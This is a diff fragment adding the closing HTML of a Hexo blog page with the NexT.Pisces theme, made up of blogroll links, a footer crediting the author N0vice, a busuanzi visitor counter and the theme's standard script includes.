+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/lemon629/" title="lemon" target="_blank">lemon</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://surager.pub/" title="5ur4g3r" target="_blank">5ur4g3r</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.snowywar.top/" title="snowywar" target="_blank">snowywar</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">N0vice</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
